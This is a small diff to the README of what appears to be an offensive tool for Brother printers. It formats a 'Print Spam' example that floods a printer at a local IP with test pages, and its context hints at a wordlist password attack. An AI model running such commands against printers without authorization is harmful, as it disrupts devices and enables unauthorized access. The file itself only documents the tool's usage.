@@ -36,11 +36,9 @@ C:\Users\DrewQ\Desktop\Brother>python main.py --wordlist "C:\Users\DrewQ\Downloa
 ```
 
 ## Print Spam
+```
 C:\Users\DrewQ\Desktop\Brother>python ohbrother.py --print-spam initpass --ip-address 192.168.0.77
 [23:41:13] INFO - [*] queued a test page
 [23:41:16] INFO - [*] queued a test page
 [23:41:19] INFO - [*] queued a test page
-[23:41:22] INFO - [*] queued a test page
-[23:41:25] INFO - [*] queued a test page
-[23:41:28] INFO - [*] queued a test page
-[23:41:31] INFO - [*] queued a test page
+```
